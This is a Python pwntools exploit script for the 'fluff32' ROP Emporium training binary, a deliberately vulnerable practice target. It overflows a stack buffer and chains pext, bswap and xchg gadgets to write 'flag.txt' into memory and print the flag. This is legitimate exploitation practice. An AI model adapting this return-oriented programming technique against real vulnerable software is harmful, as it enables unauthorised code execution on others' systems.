#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break ret de pwnme
gs='''
b *pwnme+177
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('fluff32')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

def pext_mask(src, dest):
    mask=0
    bmask=1
    while dest:
        if dest&1 == src&1:
            mask=mask | bmask
            dest>>=1
            # print(bin(mask)[2:])
        src>>=1
        bmask<<=1
    return mask

usefulFunction=elf.symbols['usefulFunction']
print_file=usefulFunction+14

# ----- Gadgets -----
# mov eax, ebp
# mov ebx, 0xb0bababa
# pext edx, ebx, eax
# mov eax, 0xdeadbeef
# ret
g_pext = 0x08048543

# 0x08048543 : mov dword ptr [edi], ebp ; ret
g_write = 0x08048543

# pop ecx; bswap ecx; ret
g_pop_bswap_ecx=0x08048558

# xchg byte [ecx], dl; ret
g_xchg_ecx=0x08048555

# pop ebp; ret
g_pop_ebp = 0x080485bb

# .data section
data = elf.get_section_by_name('.data').header['sh_addr']

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

PL =b"A"*offset

for i, c in enumerate(b'flag.txt'):
    PL+=p32(g_pop_ebp)
    PL+=p32(pext_mask(0xb0bababa,c))
    PL+=p32(g_pext)
    PL+=p32(g_pop_bswap_ecx)
    PL+=p32(data+i, endianness="big")
    PL+=p32(g_xchg_ecx)

PL+=p32(print_file)
PL+=p32(data)


# affichage du printf correspondant pour mise au point
print("")
print(f'printf "%{offset}s'+''.join([ f"\\x{c:02x}" for c in PL[offset:]])+'" A')
print("")

io.sendline(PL)
io.interactive()

